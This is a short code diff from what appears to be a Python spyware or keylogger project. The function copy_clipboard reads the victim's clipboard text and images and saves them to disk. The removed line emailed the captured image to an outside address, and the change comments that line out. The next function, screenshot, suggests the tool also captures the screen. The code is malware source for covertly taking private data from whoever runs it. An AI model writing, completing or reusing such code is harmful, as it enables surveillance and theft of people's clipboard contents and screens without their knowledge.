@@ -99,13 +99,13 @@ def copy_clipboard():
         except:
             c_info.write("Clipboard couldn't be pasted(Might not be a text)")
 
-        # If image is coppied
+        # If image is copied
         image = ImageGrab.grabclipboard()
         if isinstance(image, Image.Image):
             image.save(file_path+extend+"clipboard_image.png")
-            send_email("clipboard_image.png", file_path + extend + "clipboard_image.png", toaddress)
+            #send_email("clipboard_image.png", file_path + extend + "clipboard_image.png", toaddress)
         else:
-            exit()
+            pass
 
 
 def screenshot():
